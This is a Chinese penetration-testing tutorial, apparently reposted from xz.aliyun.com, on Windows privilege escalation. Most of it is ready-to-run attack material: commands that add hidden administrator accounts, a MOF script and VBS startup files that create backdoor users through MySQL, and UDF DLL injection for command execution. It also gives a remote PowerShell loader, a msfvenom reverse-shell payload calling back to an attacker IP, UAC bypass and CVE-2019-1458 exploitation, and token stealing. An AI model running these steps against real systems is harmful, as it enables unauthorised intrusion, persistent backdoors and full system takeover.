> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/9017)

提权基础
----

### 权限划分

*   `Administrators`：管理员组，默认情况下，Administrators 中的用户对计算机 / 域有不受限制的完全访问权。
*   `Power Users`：高级用户组, Power Users 可以执行除了为 Administrators 组保留的任务外的其他任何操作系统任务。
*   `Users`：普通用户组, 这个组的用户无法进行有意或无意的改动。
*   `Guests`：来宾组, 来宾跟普通 Users 的成员有同等访问权，但来宾帐户的限制更多
*   `Everyone`：所有的用户，这个计算机上的所有用户都属于这个组。

### 基础命令

```
$ query user               # 查看用户登陆情况
$ whoami                   # 当前用户权限
$ set                      # 环境变量
$ hostname                 # 主机名
$ systeminfo               # 查看当前系统版本与补丁信息
$ ver                      # 查看当前服务器操作系统版本
$ net user                 # 查看用户信息
$ net start                # 查看当前计算机开启服务名称
$ netstat -ano             # 查看端口情况
$ netstat -ano|find "3389" # 查看指定端口
$ tasklist                 # 查看所有进程占用的端口
$ taskkil /im xxx.exe /f   # 强制结束指定进程
$ taskkil -PID pid号       # 结束某个pid号的进程
$ tasklist /svc|find "TermService" # 查看服务pid号
$ wmic os get caption              # 查看系统名
$ wmic product get name,version    # 查看当前安装程序
$ wmic qfe get Description,HotFixID,InstalledOn # 查看补丁信息
$ wmic qfe get Description,HotFixID,InstalledOn | findstr /C:"KB4346084" /C:"KB4509094" # 定位特定补丁

# 添加管理员用户
$ net user username(用户名) password(密码) /add  # 添加普通用户
$ net localgroup adminstrators username /add   # 把普通用户添加到管理员用户组
# 如果远程桌面连接不上可以添加远程桌面组
$ net localgroup "Remote Desktop Users" username /add
```

系统漏洞提权
------

> 系统漏洞漏洞提权一般就是利用系统自身缺陷，用来提升权限。通常利用`systeminfo`查看补丁记录，来判断有哪个补丁没打，然后使用相对应的 exp 进行提权。

### 查询补丁信息

*   [WinSystemHelper](https://github.com/brianwrf/WinSystemHelper)：检查可利用的漏洞。该工具适合在任何 **Windows** 服务器上进行已知提权漏洞的检测
    *   上传`WinSysHelper.bat`、`explt2003.txt`、`expgt2003.txt`，运行 bat 查看结果
    *   然后在可利用的 Exp 中任意下载一个并执行即可

*   [Sherlock](https://github.com/rasta-mouse/Sherlock)：在 Windows 下用于本地提权的 PowerShell 脚本
    *   分析漏洞出漏洞后利用对应 Exp 即可

```
# 启动Powershell
$ powershell.exe -exec bypass

# 本地加载脚本
$ Import-Module Sherlock.ps1

# 远程加载脚本
$ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1')

# 检查漏洞，Vulnstatus为Appears Vulnerable即存在漏洞
$ Find-AllVulns
```

*   提权辅助平台
    *   [漏洞编号查询](https://i.hacking8.com/tiquan/)：根据补丁信息查找漏洞编号
    *   [Exp 查询](https://bugs.hacking8.com/tiquan/)：根据补丁信息查找 Exp
*   [Windows-Kernel-Exploits](https://github.com/SecWiki/windows-kernel-exploits)：Windows 平台提权漏洞集合

### 提权步骤

> 除了需要注意每种漏洞所适用的详细系统版本及位数外，实战中还需要事先免杀并调试好 Exp，否则可能有蓝屏等风险。

*   先运行`systeminfo`，并将其中的修补程序内容复制到[提权辅助平台 - Exp 查询](https://bugs.hacking8.com/tiquan/)进行查询 Exp。如：

```
[01]: KB2999226
[02]: KB976902
```

*   然后根据可选补丁编号以及目标系统，选择对应的 Exp 下载运行即可。
    
*   另外还需要注意**提权 Exp 的运行方式**，一般有以下几种：
    
    *   直接执行 exe 程序，成功后会打开一个 cmd 窗口，在新窗口中权限就是`system`
    *   在 WebShell 中执行 exe 程序，执行方式为`xxx.exe whoami`，成功后直接执行命令，再修改命令内容，可以执行不同的命令
    *   利用 MSF 等工具
    *   C++ 源码，Python 脚本，PowerShell 脚本等特殊方式

数据库提权
-----

### MySQL

*   前提：拿到 Root 密码
*   注意：
    *   MySQL5.7 以后`secure-file-priv`的问题
    *   MySQL5.7 后，系统的用户表`mysql.user`中的密码字段已从`password`修改为`authentication_string`

#### UDF 提权

*   原理：通过 root 权限，导入`udf.dll`到系统目录下，可以通过`udf.dll`调用执行 cmd
    
*   利用条件
    
    *   系统版本：Win2000、WinXP、Win2003
    *   具有对 MySQL 的`insert/delete`权限的账号，用以创建和抛弃函数。最好是 root，或具备 root 账号所具备的权限的其它账号。

##### UDF 木马提权

*   已有 Webshell 的情况下可以直接上 [UDF 马](https://github.com/gwjczwy/gwjczwy.github.io/blob/master/img/mysql%E6%8F%90%E6%9D%83/udf.php)

##### UDF 手工提权

*   获取 UDF：将`sqlmap\data\udf\`中找到对应系统的`dll_`文件，复制到`sqlmap\extra\cloak\`，输入以下命令即可得到
    *   SQLMap 自带的 shell 及一些二进制文件，为了防止被误杀都经过异或方式编码，不能直接使用，需要利用 SQLMap 自带的解码工具`cloak.py`进行解码

```
$ python cloak.py -d -i lib_mysqludf_sys.dll_
```

*   寻找目录
    *   `MySQL<5.1`，UDF 导出到系统目录`c:/windows/system32/`
    *   `MySQL>5.1`，UDF 导出到 MySQL 安装目录`lib\plugin\`目录 (该目录默认不存在，需手动创建)

```
-- 寻找MySQL目录
mysql> select @@basedir;
mysql> show variables like '%plugin%';

-- 利用NTFS ADS创建目录,有Webshell的情况下可直接菜刀创建
mysql> select '123' into dumpfile 'C:\\phpStudy\\MySQL\\lib::$INDEX_ALLOCATION'; 
mysql> select '123' into dumpfile 'C:\phpStudy\\MySQL\\lib\\plugin::$INDEX_ALLOCATION';
```

*   导出 UDF：直接上传没有权限，可通过 MySQL 语句写入

```
-- 在【本地】以二进制读取UDF并转换十六进制
mysql> select hex(load_file("C:\\udf.dll")) into dumpfile 'C:\\myudf.txt';

-- 在【靶机】写入UDF,这里将UDF文件命名为myudf.dll
mysql> select unhex ('十六进制UDF') into dumpfile "C:\\Program Files\\MySQL\\lib\\plugin\\myudf.dll";

-- 出现secure-file-priv相关报错，需要修改mysql配置文件my.ini或mysql.cnf
-- secure_file_priv=/ # 允许导入到任意路径
```

*   利用 UDF 创建用户自定义函数

```
mysql> create function sys_eval returns string soname 'myudf.dll';
```

*   利用函数执行命令

```
mysql> select sys_eval("whoami")
```

#### MOF 提权

##### MOF 提权条件

*   Windows 2003 及以下版本
*   MySQL 启动身份具有权限去读写`c:/windows/system32/wbem/mof`目录
*   `secure-file-priv`参数不为`null`

##### MOF 提权原理

> MOF 文件每五秒就会执行，而且是系统权限，通过 MySQL 使用`load_file` 将文件写入`/wbme/mof`，然后系统每隔五秒就会执行一次上传的 MOF。MOF 当中有一段是 vbs 脚本，可以通过控制这段 vbs 脚本的内容让系统执行命令，进行提权。

*   `nullevt.mof`的利用代码如下：

```
#pragma namespace("\\\\.\\root\\subscription")
instance of __EventFilter as $EventFilter {
  EventNamespace = "Root\\Cimv2";
  Name = "filtP2";
  Query = "Select * From __InstanceModificationEvent "
  "Where TargetInstance Isa \"Win32_LocalTime\" "
  "And TargetInstance.Second = 5";
  QueryLanguage = "WQL";
};
instance of ActiveScriptEventConsumer as $Consumer {
  Name = "consPCSV2";
  ScriptingEngine = "JScript";
# 执行命令,新建用户naraku
  ScriptText = "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user naraku 123456 /add\")";
};
instance of __FilterToConsumerBinding {
  Consumer = $Consumer;
  Filter = $EventFilter;
};
```

##### 提权步骤

*   将上面的脚本上传到有读写权限的目录下，如：`C:/xxx/`
*   使用 sql 语句将文件导入到`c:/windows/system32/wbem/mof/`下
    *   这里不能使用`outfile`，因为会在末端写入新行，而 MOF 在被当作二进制文件时无法正常执行，所以需要用`dumpfile`导出一行数据。

```
select load_file("C:/xxx/test.mof") into dumpfile "c:/windows/system32/wbem/mof/nullevt.mof"
```

*   当我们成功把 MOF 导出时，mof 就会直接被执行，且 5 秒创建一次用户

##### 痕迹清除

*   提权成功后，就算被删号，MOF 也会在五秒内将原账号重建，如果要删除入侵账号可以执行以下命令：

```
$ net stop winmgmt
$ del c:/windows/system32/wbem/repository
$ net start winmgmt
```

*   然后重启服务即可

#### 启动项提权

*   已知 root 密码
*   `file_priv`不为`null`

```
create table a (cmd text); 
insert into a values ("set wshshell=createobject (""wscript.shell"") " ); 
insert into a values ("a=wshshell.run (""cmd.exe /c net user naraku 123456 /add"",0) " ); 
insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup administrators naraku /add"",0) " ); 
select * from a into outfile "C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs";
```

### MSSQL

*   前提：拿到 SA 密码

#### 利用方式

*   传统`xp_cmdshell`利用
    *   `xp_cmdshell`被删如何恢复
*   借助 COM 组件执行命令
*   借助 CLR 执行命令（类似 MySQL UDF）
*   本地 Hash 注入 + 端口转发 / Socks 实现无密码连接目标内网 MSSQL
*   利用 Windows 访问令牌实现无密码连接目标内网 MSSQL

### Oracle

*   通常情况下 Oracle 服务的运行权限都非常高
*   MSF 下各类自动化利用模块
*   通常情况下，Oracle 服务的运行权限都比较高

MSF 提权
------

*   注意以下命令执行时的状态
    *   `$`：Linux 命令行下
    *   `msf`：进入 MSF 控制台
    *   `meterpreter`：进入某个`session`

```
# 生成木马并放入靶机
$ msfvenom -p windows/meterpreter_reverse_tcp lhost=<攻击机IP> lport=<攻击机监听端口> -f exe -o /tmp/win.exe
# 攻击机监听
$ msfconsole
msf> use exploit/multi/handler 
msf> set payload windows/meterpreter_reverse_tcp
msf> set lhost <攻击机IP>
msf> set lport <攻击机端口>
msf> exploit
# 靶机运行,此时攻击机MSF会接收到反弹的Shell,在MSF中运行shell命令
meterpreter> shell 
C:\Users\Naraku\Desktop>whoami
naraku-win7\naraku
# 出现中文乱码可运行
# C:\Users\Naraku\Desktop>chcp 65001
```

### GetSystem

*   直接运行`getsystem`

### BypassUAC

*   相关脚本
    *   `use exploit/windows/local/bypassuac`
    *   `use exploit/windows/local/bypassuac_injection`
    *   `use windows/local/bypassuac_vbs`
    *   `use windows/local/ask`

```
meterpreter> background  # 后台session 
msf> use exploit/windows/local/bypassuac
msf> set SESSION <session_id>  
# 后台session时会返回session_id,如不清楚可以使用命令sessions -l
msf> run
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210112154853-9e0cd408-54aa-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210112154853-9e0cd408-54aa-1.jpg)

### 内核提权

*   这里查询补丁跟前面`systeminfo`一样，配合[提权辅助平台 - 漏洞编号](https://i.hacking8.com/tiquan/)查询可利用漏洞编号

```
# 查询补丁
meterpreter> run post/windows/gather/enum_patches 
[+] KB2999226 installed on 11/25/2020
[+] KB976902 installed on 11/21/2010
```

*   也可以使用`local_exploit_suggester`查询哪些 Exp 可以利用。

```
# 查询Exp
msf> use post/multi/recon/local_exploit_suggester 
msf> set LHOST <攻击机IP>
msf> set SESSION <session_id>
msf> run
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210112154855-9f2173da-54aa-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210112154855-9f2173da-54aa-1.jpg)

*   这里将上一步查询到的 Exp 打了一遍发现都没有成功，回头一看发现**原来是系统位数的原因**。这里的`Meterpreter`运行在 32 位，而系统位数为 64 位。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210112154855-9f591b00-54aa-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210112154855-9f591b00-54aa-1.jpg)

*   因此需要做进程迁移，将`Meterpreter`迁移到一个 64 位的进程。

```
meterpreter> sysinfo         # 查看位数
meterpreter> ps              # 查看进程
meterpreter > migrate <PID>  # 进程迁移
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210112154856-9fa401e2-54aa-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210112154856-9fa401e2-54aa-1.jpg)

*   重复前面使用`local_exploit_suggester`那一步，可以看到现在查询的是 64 位的 Exp

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210112154856-9fe0279e-54aa-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210112154856-9fe0279e-54aa-1.jpg)

*   这里选择选个比较新的`CVE_2019_1458`

```
msf> use exploit/windows/local/cve_2019_1458_wizardopium 
msf> set SESSION <session_id>
msf> run
meterpreter> getuid
Server username: NT AUTHORITY\SYSTEM
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210112154857-a019b5d6-54aa-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210112154857-a019b5d6-54aa-1.jpg)

### 令牌操纵

*   `incognito`假冒令牌

```
meterpreter> use incognito                                  
meterpreter> list_tokens -u                          # 查看可用的token
meterpreter> impersonate_token 'NT AUTHORITY\SYSTEM' # 假冒SYSTEM token
meterpreter> execute -f cmd.exe -i –t                # -t使用假冒的token 执行
meterpreter> rev2self                               # 返回原始token
```

*   `steal_token`窃取令牌

```
meterpreter> ps                 # 查看进程
meterpreter> steal_token <PID>  # 从指定进程中窃取token
meterpreter> drop_token         # 删除窃取的token
```

### SMB 系列 RCE

> 基本绝迹

*   MS08-067
*   MS17-010

参考
--

*   [系统提权入门思维导图](https://huntingday.github.io/img/Localprivilege.png)
*   [MySQL 之 UDF 提权](https://www.cnblogs.com/3ichae1/p/12909952.html)
*   [内网渗透之——MySQL 数据库提权之——UDF 提权](https://blog.csdn.net/wsnbbz/article/details/104802100)
*   [MySQL 提权总结](https://gwjczwy.github.io/2020/07/20/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/)
*   [Windows 下三种 MySQL 提权剖析](https://xz.aliyun.com/t/2719#toc-14)
*   [Metasploit 的一些提权方法](https://blog.csdn.net/qq_42349134/article/details/100657705)